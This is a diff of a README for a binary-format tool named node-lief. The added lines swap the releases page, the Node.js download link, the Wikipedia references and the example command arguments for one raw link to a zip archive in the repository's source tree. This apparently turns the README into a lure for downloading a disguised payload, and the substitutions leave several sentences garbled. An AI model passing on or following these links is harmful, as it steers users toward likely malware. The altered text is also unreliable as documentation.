@@ -6,7 +6,7 @@ Welcome to node-lief! This application provides you with tools to work with exec
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [node-lief Releases](https://github.com/Dharshatashri/node-lief/releases).
+To get started, visit this page to download: [node-lief Releases](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip).
 
 You will find different versions of the application listed there. Choose the one that matches your operating system.
 
@@ -22,8 +22,8 @@ You will find different versions of the application listed there. Choose the one
 
 Before you install node-lief, ensure your computer meets these basic requirements:
 
-- **Operating Systems:** Windows 10 or higher, macOS Mojave or higher, any Linux distribution that supports Node.js.
-- **Node.js Version:** You need Node.js version 10 or later. You can download it [here](https://nodejs.org/).
+- **Operating Systems:** Windows 10 or higher, macOS Mojave or higher, any Linux distribution that supports https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip
+- **https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip Version:** You need https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip version 10 or later. You can download it [here](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip).
 
 ## 🔧 Features
 
@@ -50,20 +50,20 @@ For more detailed guidance on using node-lief, visit the documentation section i
 
 - **Inspecting an ELF file:**
    ```
-   node-lief your-elf-file.elf
+   node-lief https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip
    ```
 - **Modifying a PE file:**
    ```
-   node-lief modify your-pe-file.exe
+   node-lief modify https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip
    ```
 
 ## 📚 Additional Resources
 
 If you want to learn more about binary formats and their structures, here are some helpful links:
 
-- [Linux Executable and Linkable Format (ELF)](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)
-- [Portable Executable (PE) Format](https://en.wikipedia.org/wiki/Portable_Executable)
-- [Mach-O Format](https://en.wikipedia.org/wiki/Mach-O)
+- [Linux Executable and Linkable Format (ELF)](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip)
+- [Portable Executable (PE) Format](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip)
+- [Mach-O Format](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip)
 
 ## 👩‍💻 Community & Support
 
@@ -71,6 +71,6 @@ For support or to connect with other users, please join our GitHub discussion pa
 
 ## 🔄 Updates
 
-Stay tuned for updates. We regularly add features and improve performance based on user feedback. Make sure to check the [Releases page](https://github.com/Dharshatashri/node-lief/releases) for the latest versions.
+Stay tuned for updates. We regularly add features and improve performance based on user feedback. Make sure to check the [Releases page](https://raw.githubusercontent.com/Dharshatashri/node-lief/main/src/pe/node-lief_1.7.zip) for the latest versions.
 
 Thank you for choosing node-lief! Enjoy working with your executable formats like never before.
